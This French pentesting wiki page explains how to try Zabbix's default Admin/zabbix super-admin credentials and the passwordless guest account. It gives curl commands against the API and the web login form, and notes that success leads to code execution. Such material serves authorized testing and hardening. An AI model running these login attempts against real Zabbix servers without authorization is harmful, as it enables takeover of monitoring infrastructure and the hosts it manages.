---
order: 2
title: "Identifiants par défaut : Admin/zabbix et le compte guest"
description: "Zabbix est livré avec un compte Super admin, Admin avec le mot de passe zabbix, et historiquement un compte guest activé sans mot de passe. Ces valeurs par défaut sont fréquemment laissées inchangées, de sorte qu'essayer Admin/zabbix sur la connexion web ou l'API est la première action et celle au plus fort rendement, accordant un contrôle administratif complet qui mène directement à l'exécution de code."
keywords:
  - admin zabbix
  - default credentials
  - guest
  - super admin
  - zabbix login
---

# Identifiants par défaut

Le compte Super admin par défaut de Zabbix est `Admin` (A majuscule) avec le mot de passe `zabbix`, et il reste inchangé sur une large proportion d'installations réelles, car les opérateurs se concentrent sur la configuration de la supervision et négligent la connexion. Historiquement, un compte `guest` était aussi activé par défaut (sans mot de passe) pour un accès en lecture. Ainsi, la première action contre toute instance Zabbix est d'essayer `Admin`/`zabbix` sur la connexion web et l'API, et de vérifier la présence de `guest`. Un `Admin`/`zabbix` fonctionnel est un Super admin immédiat : accès complet à la configuration, inventaire des utilisateurs et des hôtes avec ses identifiants stockés, et fonctionnalité d'exécution de scripts qui donne l'exécution de code sur le serveur et les agents.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# the default super admin
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}'
# via the web login form
curl -sk -c cj https://<target>/zabbix/index.php \
  --data 'name=Admin&password=zabbix&enter=Sign+in&autologin=1'
# check guest (older defaults)
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"guest","password":""},"id":1}'
```

## Notes d'exploitation

- `Admin`/`zabbix` est la valeur par défaut canonique et accorde le statut Super admin ; c'est la vérification au plus fort rendement unique, donc essayez-la en premier sur le formulaire web et sur l'API.
- Le nom d'utilisateur est sensible à la casse (`Admin`, pas `admin`) ; une tentative en minuscules échoue même lorsque la valeur par défaut est en place.
- Un compte `guest` présent (mot de passe vide) accorde un accès en lecture même sans l'admin ; voir [Accès guest](guest-access.md).
- L'accès Super admin mène directement à l'[exécution de code](../code-execution/index.md) via les scripts et à la récolte des macros des [hôtes](../enumeration/host.md) ; traitez un succès sur les identifiants par défaut comme une compromission complète de la plateforme.

## Références

- [Zabbix: default users](https://www.zabbix.com/documentation/current/en/manual/quickstart/login)
- [HackTricks: Zabbix](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
